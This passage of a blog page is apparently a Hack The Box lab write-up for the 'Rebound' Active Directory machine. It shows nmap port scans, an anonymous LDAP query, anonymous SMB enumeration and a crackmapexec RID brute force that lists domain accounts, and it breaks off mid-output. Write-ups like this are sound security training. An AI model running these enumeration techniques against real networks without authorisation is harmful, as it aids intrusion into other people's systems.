class="widget-tag-list-link" href="/tags/tgt/" rel="tag">tgt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/username-anarchy/" rel="tag">username-anarchy</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wapt/" rel="tag">wapt</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/websocket/" rel="tag">websocket</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/winlogon/" rel="tag">winlogon</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/ysoserial-net/" rel="tag">ysoserial.net</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/zip/" rel="tag">zip</a></li><li class="widget-tag-list-item"><a class="widget-tag-list-link" href="/tags/%E5%AE%9E%E4%BE%8B%E8%AE%B0%E5%BD%95/" rel="tag">实例记录</a></li></ul>
    </div>
  </div>


  
  <div class="sticky">
    
      


  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Categories</h3>
      <div class="category-box">
            <a class="category-link" href="/categories/cloud/">
                cloud
                <div class="category-count">8</div>
            </a>
        
            <a class="category-link" href="/categories/forensic/">
                forensic
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/AD/">
                AD
                <div class="category-count">12</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-5/">
                htb-Season-5
                <div class="category-count">7</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-6/">
                htb-Season-6
                <div class="category-count">10</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-4/">
                htb-Season-4
                <div class="category-count">3</div>
            </a>
        
            <a class="category-link" href="/categories/htb-Season-7/">
                htb-Season-7
                <div class="category-count">9</div>
            </a>
        
            <a class="category-link" href="/categories/CVE/">
                CVE
                <div class="category-count">1</div>
            </a>
        
            <a class="category-link" href="/categories/ctf/">
                ctf
                <div class="category-count">8</div>
            </a>
        
            <a class="category-link" href="/categories/Sherlocks/">
                Sherlocks
                <div class="category-count">1</div>
            </a>
        </div>
    </div>
  </div>


    
      
  <div class="widget-wrap">
    <div class="widget">
      <h3 class="widget-title">Recent Posts</h3>
      <ul>
        
          <a class="recent-link" href="/2025/06/04/Tracks-AD-APT/" title="Tracks-AD-APT" >
            <div class="recent-link-text">
              Tracks-AD-APT
            </div>
          </a>
        
          <a class="recent-link" href="/2025/05/30/crtp-cert-en/" title="crtp-cert-en" >
            <div class="recent-link-text">
              crtp-cert-en
            </div>
          </a>
        
          <a class="recent-link" href="/2025/05/29/crtp-cert/" title="crtp-cert" >
            <div class="recent-link-text">
              crtp-cert
            </div>
          </a>
        
          <a class="recent-link" href="/2025/05/21/crtp-lab-note/" title="crtp-study-lab-note" >
            <div class="recent-link-text">
              crtp-study-lab-note
            </div>
          </a>
        
          <a class="recent-link" href="/2025/04/22/box-wp-Scepter/" title="【season-7】 htb Scepter wp" >
            <div class="recent-link-text">
              【season-7】 htb Scepter wp
            </div>
          </a>
        
      </ul>
    </div>
  </div>

    
  </div> 
</sidebar>


    </div>
    
    <div id="toc" class="widget-wrap">
      <button class="toc-toggle" onclick="toggleTOC()">
    <span class="toc-toggle-icon">
        <i class="fa fa-angle-down" aria-hidden="true" style="border-radius: 50%; padding: 5px; border: 1px solid var(--link);"></i>
    </span>
</button>
<div id="tocContainer" style="display: block;">
    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#to-User"><span class="toc-number">1.</span> <span class="toc-text">to User</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#to-Root"><span class="toc-number">2.</span> <span class="toc-text">to Root</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#RBCD"><span class="toc-number">2.1.</span> <span class="toc-text">RBCD</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CD"><span class="toc-number">2.2.</span> <span class="toc-text">CD</span></a></li></ol></li></ol>
</div>
<script>
    function toggleTOC() {
        const tocContainer = document.getElementById('tocContainer');
        tocContainer.style.display = tocContainer.style.display === 'none' ? 'block' : 'none';
        const toggleIcon = document.querySelector('.toc-toggle-icon i');
        toggleIcon.classList.toggle('fa-angle-down');
        toggleIcon.classList.toggle('fa-angle-up');
    }
</script>
<style>
    .toc-toggle {
        position: relative;
        display: inline-block;
        padding: 2% 2% 2%;
        border: none;
        border-radius: 100%;
        background-color: var(--link);
        cursor: pointer;
        transition: all 0.1s ease;
        box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1);
        /* position: absolute; */
        top: 0;
        right: 0;
        z-index: 10;
    }

    .toc-toggle:hover {
        background-color: var(--selection-bg);
        transform: scale(1.1);
    }

    .toc-toggle-icon {
        display: inline-block;
        vertical-align: middle;
    }

    .toc-toggle-icon i {
        display: inline-block;
        border-radius: 50%; /* Ensures the icon itself is a perfect circle */
    }

    /* #tocContainer {
        display: block;
        margin-top: 10px;
    } */
    #tocContainer {
    position: relative;
    padding-top: 10px; /* 留出按钮位置 */
}
</style>


    </div>
    
    <div id="content-body">
       


<article id="post-Tracks-AD-Rebound" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  
    
<div class="article-gallery">
  <div class="article-gallery-photos">
    
      <a class="article-gallery-img" rel="gallery_cmaxud0z3000xjgkydyoz1az6">
        <img src="/wpimages/2024/tracks-ad/Rebound/background.jpg" itemprop="image">
      </a>
    
  </div>
</div>

   
  <div class="article-inner">
    <div class="article-main">
      <header class="article-header">
        
<div class="main-title-bar">
  <div class="main-title-dot"></div>
  
    
      <h1 class="p-name article-title" itemprop="headline name">
        Tracks-AD-Rebound
      </h1>
    
  
</div>

        <div class='meta-info-bar'>
          <div class="meta-info">
  <time class="dt-published" datetime="2024-12-12T07:35:24.000Z" itemprop="datePublished">2024-12-12</time>
</div>
          <div class="need-seperator meta-info">
            <div class="meta-cate-flex">
  
  <a class="meta-cate-link" href="/categories/AD/">AD</a>
   
</div>
  
          </div>
          <div class="wordcount need-seperator meta-info">
            38k words 
          </div>
        </div>
        
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/AD/" rel="tag">AD</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/AS-REQ-ST/" rel="tag">AS-REQ ST</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/DACL/" rel="tag">DACL</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/brute-rid/" rel="tag">brute-rid</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/bypass-kerberos-only/" rel="tag">bypass-kerberos-only</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/cd/" rel="tag">cd</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/no-preAuth/" rel="tag">no-preAuth</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/rbcd/" rel="tag">rbcd</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/remote-potato/" rel="tag">remote-potato</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/rosating/" rel="tag">rosating</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/winlogon/" rel="tag">winlogon</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

      </header>
      <div class="e-content article-entry" itemprop="articleBody">
        
          <figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line">└─$ sudo nmap -sS 10.10.11.231 -p- --min-rate=2000</span><br><span class="line">[sudo] password <span class="keyword">for</span> fonllge:</span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 01:52 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.231</span><br><span class="line">Host is up (0.14s latency).</span><br><span class="line">Not shown: 65509 closed tcp ports (reset)</span><br><span class="line">PORT      STATE SERVICE</span><br><span class="line">53/tcp    open  domain</span><br><span class="line">88/tcp    open  kerberos-sec</span><br><span class="line">135/tcp   open  msrpc</span><br><span class="line">139/tcp   open  netbios-ssn</span><br><span class="line">389/tcp   open  ldap</span><br><span class="line">445/tcp   open  microsoft-ds</span><br><span class="line">464/tcp   open  kpasswd5</span><br><span class="line">593/tcp   open  http-rpc-epmap</span><br><span class="line">636/tcp   open  ldapssl</span><br><span class="line">3268/tcp  open  globalcatLDAP</span><br><span class="line">3269/tcp  open  globalcatLDAPssl</span><br><span class="line">5985/tcp  open  wsman</span><br><span class="line">9389/tcp  open  adws</span><br><span class="line">47001/tcp open  winrm</span><br><span class="line">49664/tcp open  unknown</span><br><span class="line">49665/tcp open  unknown</span><br><span class="line">49666/tcp open  unknown</span><br><span class="line">49667/tcp open  unknown</span><br><span class="line">49673/tcp open  unknown</span><br><span class="line">49690/tcp open  unknown</span><br><span class="line">49691/tcp open  unknown</span><br><span class="line">49692/tcp open  unknown</span><br><span class="line">49705/tcp open  unknown</span><br><span class="line">49723/tcp open  unknown</span><br><span class="line">49744/tcp open  unknown</span><br><span class="line">49807/tcp open  unknown</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">└─$ sudo nmap -sU 10.10.11.231 --top-ports=200- --min-rate=2000 </span><br><span class="line">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-12-10 01:53 EST</span><br><span class="line">Nmap scan report <span class="keyword">for</span> 10.10.11.231</span><br><span class="line">Host is up (0.12s latency).</span><br><span class="line">Not shown: 195 open|filtered udp ports (no-response)</span><br><span class="line">PORT      STATE  SERVICE</span><br><span class="line">53/udp    open   domain</span><br><span class="line">88/udp    open   kerberos-sec</span><br><span class="line">123/udp   open   ntp</span><br><span class="line">389/udp   open   ldap</span><br><span class="line">49184/udp closed unknown</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br></pre></td><td class="code"><pre><span class="line">└─$ ldapsearch -x -H ldap://10.10.11.231 -s base</span><br><span class="line"># extended LDIF</span><br><span class="line">#</span><br><span class="line"># LDAPv3</span><br><span class="line"># base &lt;&gt; (default) with scope baseObject</span><br><span class="line"># filter: (objectclass=*)</span><br><span class="line"># requesting: ALL</span><br><span class="line">#</span><br><span class="line"></span><br><span class="line">#</span><br><span class="line">dn:</span><br><span class="line">domainFunctionality: 7</span><br><span class="line">forestFunctionality: 7</span><br><span class="line">domainControllerFunctionality: 7</span><br><span class="line">rootDomainNamingContext: DC=rebound,DC=htb</span><br><span class="line">ldapServiceName: rebound.htb:dc01$@REBOUND.HTB</span><br><span class="line">isGlobalCatalogReady: TRUE</span><br><span class="line">supportedSASLMechanisms: GSSAPI</span><br><span class="line">supportedSASLMechanisms: GSS-SPNEGO</span><br><span class="line">supportedSASLMechanisms: EXTERNAL</span><br><span class="line">supportedSASLMechanisms: DIGEST-MD5</span><br><span class="line">supportedLDAPVersion: 3</span><br><span class="line">supportedLDAPVersion: 2</span><br><span class="line">supportedLDAPPolicies: MaxPoolThreads</span><br><span class="line">supportedLDAPPolicies: MaxPercentDirSyncRequests</span><br><span class="line">supportedLDAPPolicies: MaxDatagramRecv</span><br><span class="line">supportedLDAPPolicies: MaxReceiveBuffer</span><br><span class="line">supportedLDAPPolicies: InitRecvTimeout</span><br><span class="line">supportedLDAPPolicies: MaxConnections</span><br><span class="line">supportedLDAPPolicies: MaxConnIdleTime</span><br><span class="line">supportedLDAPPolicies: MaxPageSize</span><br><span class="line">supportedLDAPPolicies: MaxBatchReturnMessages</span><br><span class="line">supportedLDAPPolicies: MaxQueryDuration</span><br><span class="line">supportedLDAPPolicies: MaxDirSyncDuration</span><br><span class="line">supportedLDAPPolicies: MaxTempTableSize</span><br><span class="line">supportedLDAPPolicies: MaxResultSetSize</span><br><span class="line">supportedLDAPPolicies: MinResultSets</span><br><span class="line">supportedLDAPPolicies: MaxResultSetsPerConn</span><br><span class="line">supportedLDAPPolicies: MaxNotificationPerConn</span><br><span class="line">supportedLDAPPolicies: MaxValRange</span><br><span class="line">supportedLDAPPolicies: MaxValRangeTransitive</span><br><span class="line">supportedLDAPPolicies: ThreadMemoryLimit</span><br><span class="line">supportedLDAPPolicies: SystemMemoryLimitPercent</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.319</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.801</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.473</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.528</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.417</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.619</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.841</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.529</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.805</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.521</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.970</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1338</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.474</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1339</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1340</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1413</span><br><span class="line">supportedControl: 2.16.840.1.113730.3.4.9</span><br><span class="line">supportedControl: 2.16.840.1.113730.3.4.10</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1504</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1852</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.802</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1907</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1948</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1974</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.1341</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2026</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2064</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2065</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2066</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2090</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2205</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2204</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2206</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2211</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2239</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2255</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2256</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2309</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2330</span><br><span class="line">supportedControl: 1.2.840.113556.1.4.2354</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.800</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.1670</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.1791</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.1935</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.2080</span><br><span class="line">supportedCapabilities: 1.2.840.113556.1.4.2237</span><br><span class="line">subschemaSubentry: CN=Aggregate,CN=Schema,CN=Configuration,DC=rebound,DC=htb</span><br><span class="line">serverName: CN=DC01,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configur</span><br><span class="line"> ation,DC=rebound,DC=htb</span><br><span class="line">schemaNamingContext: CN=Schema,CN=Configuration,DC=rebound,DC=htb</span><br><span class="line">namingContexts: DC=rebound,DC=htb</span><br><span class="line">namingContexts: CN=Configuration,DC=rebound,DC=htb</span><br><span class="line">namingContexts: CN=Schema,CN=Configuration,DC=rebound,DC=htb</span><br><span class="line">namingContexts: DC=DomainDnsZones,DC=rebound,DC=htb</span><br><span class="line">namingContexts: DC=ForestDnsZones,DC=rebound,DC=htb</span><br><span class="line">isSynchronized: TRUE</span><br><span class="line">highestCommittedUSN: 172157</span><br><span class="line">dsServiceName: CN=NTDS Settings,CN=DC01,CN=Servers,CN=Default-First-Site-Name,</span><br><span class="line"> CN=Sites,CN=Configuration,DC=rebound,DC=htb</span><br><span class="line">dnsHostName: dc01.rebound.htb</span><br><span class="line">defaultNamingContext: DC=rebound,DC=htb</span><br><span class="line">currentTime: 20241210134033.0Z</span><br><span class="line">configurationNamingContext: CN=Configuration,DC=rebound,DC=htb</span><br><span class="line"></span><br><span class="line"># search result</span><br><span class="line">search: 2</span><br><span class="line">result: 0 Success</span><br><span class="line"></span><br><span class="line"># numResponses: 2</span><br><span class="line"># numEntries: 1</span><br></pre></td></tr></table></figure>

<h1 id="to-User"><a href="#to-User" class="headerlink" title="to User"></a>to User</h1><p>smb存在匿名用户可访问</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">	└─$ smbmap -u anonymous -p &#x27;&#x27; -H 10.10.11.231 -r &#x27;IPC$&#x27; --depth 5 -A &#x27;ROUTER&#x27;</span><br><span class="line"></span><br><span class="line">    ________  ___      ___  _______   ___      ___       __         _______</span><br><span class="line">   /&quot;       )|&quot;  \    /&quot;  ||   _  &quot;\ |&quot;  \    /&quot;  |     /&quot;&quot;\       |   __ &quot;\</span><br><span class="line">  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)</span><br><span class="line">   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /&#x27; /\  \     |:  ____/</span><br><span class="line">    __/  \   |: \.        |(|  _  \  |: \.        |  //  __&#x27;  \    (|  /</span><br><span class="line">   /&quot; \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \</span><br><span class="line">  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)</span><br><span class="line"> -----------------------------------------------------------------------------</span><br><span class="line">     SMBMap - Samba Share Enumerator | Shawn Evans - ShawnDEvans@gmail.com</span><br><span class="line">                     https://github.com/ShawnDEvans/smbmap</span><br><span class="line"></span><br><span class="line">[*] Detected 1 hosts serving SMB</span><br><span class="line">[*] Established 1 SMB session(s)</span><br><span class="line">[*] Performing file name pattern match!</span><br><span class="line">[+] Match found! Downloading: IPC$/ROUTER</span><br><span class="line">[+] Starting download: IPC$\ROUTER (3 bytes)</span><br><span class="line">[+] File output to: /home/fonllge/Desktop/htb/Rebound/10.10.11.231-IPC_ROUTER</span><br><span class="line"></span><br><span class="line">[+] IP: 10.10.11.231:445        Name: dc01.rebound.htb          Status: Authenticated</span><br><span class="line">        Disk                                                    Permissions     Comment</span><br><span class="line">        ----                                                    -----------     -------</span><br><span class="line">        IPC$                                                    READ ONLY       Remote IPC</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    InitShutdown</span><br><span class="line">        fr--r--r--                4 Sun Dec 31 19:03:58 1600    lsass</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ntsvcs</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    scerpc</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-38c-0</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    epmapper</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-1e8-0</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    LSM_API_service</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    eventlog</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-488-0</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    atsvc</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-5c0-0</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-288-0</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-288-1</span><br><span class="line">        fr--r--r--                4 Sun Dec 31 19:03:58 1600    wkssvc</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-6f8-0</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    RpcProxy\49690</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    fefb370f7941e4fa</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    RpcProxy\593</span><br><span class="line">        fr--r--r--                4 Sun Dec 31 19:03:58 1600    srvsvc</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    netdfs</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    vgauth-service</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    W32TIME_ALT</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    tapsrv</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    ROUTER</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-270-0</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-b7c-0</span><br><span class="line">        fr--r--r--                3 Sun Dec 31 19:03:58 1600    cert</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-b18-0</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    PIPE_EVENTROOT\CIMV2SCM EVENT PROVIDER</span><br><span class="line">        fr--r--r--                1 Sun Dec 31 19:03:58 1600    Winsock2\CatalogChangeListener-b6c-0</span><br><span class="line">        Shared                                                  READ ONLY</span><br></pre></td></tr></table></figure>

<p>smb可通，自然就可以跑rid</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">└─$ crackmapexec smb -u anonymous -p &#x27;&#x27; --rid-brute 10000 rebound.htb</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             [+] rebound.htb\anonymous:</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             [+] Brute forcing RIDs</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             498: rebound\Enterprise Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             500: rebound\Administrator (SidTypeUser)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             501: rebound\Guest (SidTypeUser)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             502: rebound\krbtgt (SidTypeUser)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             512: rebound\Domain Admins (SidTypeGroup)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             513: rebound\Domain Users (SidTypeGroup)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             514: rebound\Domain Guests (SidTypeGroup)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             515: rebound\Domain Computers (SidTypeGroup)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             516: rebound\Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             517: rebound\Cert Publishers (SidTypeAlias)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             518: rebound\Schema Admins (SidTypeGroup)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             519: rebound\Enterprise Admins (SidTypeGroup)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             520: rebound\Group Policy Creator Owners (SidTypeGroup)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             521: rebound\Read-only Domain Controllers (SidTypeGroup)</span><br><span class="line">SMB         dc01.rebound.htb 445    DC01             522: rebound\Cloneable Domain Controllers 